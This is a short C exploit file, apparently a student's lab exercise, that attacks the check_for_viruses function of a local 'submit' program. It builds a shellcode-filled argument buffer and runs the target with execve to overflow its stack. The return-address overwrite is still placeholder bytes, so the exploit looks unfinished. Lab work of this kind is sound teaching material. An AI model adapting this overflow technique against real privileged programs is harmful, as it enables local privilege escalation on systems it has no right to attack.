/*
 * sploit1.c
 * buffer overflow version, attack the check_for_viruses function
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include "shellcode.h"

#define TARGET "/usr/local/bin/submit" // or submitV2


int main(void) {
    FILE *fp;
	char *env[1];
    char *argv[4];
    char argbuf[2009]; // 300 for buffer, 4 for ebp, 4 for eip
    long buf_addr = 0xffbfdc70;
    int i, len;

    // create the argbuf
    strcpy(argbuf, shellcode);
    // fill the argbuf with dot
    len = strlen(argbuf);

    for(i = len; i < 2000; i++){
        argbuf[i] = '.';
    }

    strcpy(argbuf+500, "\x01\x02\x03\x04\x05\x06\x07\x08");

    
    // get the buffer location using gdb
    //long buffer_addr = 0xffbfdb68;
	// one way to invoke submit
	//system(TARGET "\"Hello world!\"");

	// another way
	argv[0] = argbuf;
	argv[1] = "-v"; 
    argv[2] = NULL;
    argv[3] = NULL;

	env[0] = NULL;

	execve(TARGET, argv, env);
    fprintf(stderr, "execve failed\n");
    
	// execve only returns if it fails
	
	return 1;
}
